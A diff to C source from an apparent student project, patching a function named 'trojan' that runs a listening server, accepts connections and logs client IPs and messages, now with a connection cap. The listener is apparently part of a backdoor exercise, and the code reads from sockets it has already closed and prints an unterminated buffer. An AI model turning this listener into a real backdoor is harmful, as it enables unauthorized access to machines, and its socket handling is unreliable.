@@ -6,7 +6,7 @@
 /*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2017/06/01 15:20:54 by hivian            #+#    #+#             */
-/*   Updated: 2017/06/02 12:39:38 by hivian           ###   ########.fr       */
+/*   Updated: 2017/06/02 15:08:31 by hivian           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -56,15 +56,32 @@ void		trojan(t_env *e)
 		exit(1);
 	lock_file(e);
 	create_server(e);
+	int total_connection = 0;
+	char buffer[256];
+	bzero(buffer, sizeof(buffer));
 	while (1)
 	{
 		fprintf(e->f_logs, "Waiting for a new connection.\n");
 		fflush(e->f_logs);
 		if ((e->csock = accept(e->hsock, (struct sockaddr *)&e->haddr, &e->haddr_size)) == -1)
 			exit(1);
-		get_client_ip(e);
-		fprintf(e->f_logs, "Received new connection: %s:%d\n", e->client_ip, e->client_port);
-		fflush(e->f_logs);
+		if (total_connection < MAX_CLIENTS)
+		{
+			total_connection++;
+			get_client_ip(e);
+			fprintf(e->f_logs, "Received new connection: %s:%d\n", e->client_ip, e->client_port);
+		}
+		else
+		{
+			fprintf(e->f_logs, "Max number of users reached. Limit: %d\n", MAX_CLIENTS);
+			close(e->csock);
+		}
+		int ret = read(e->csock, buffer, 256);
+		if (ret < 0)
+			fprintf(e->f_logs, "Read error\n");
+		if (ret == 0)
+			total_connection--;
+		fprintf(e->f_logs, "Message: %s\n", buffer);
 	}
 	fclose(e->f_logs);
 }
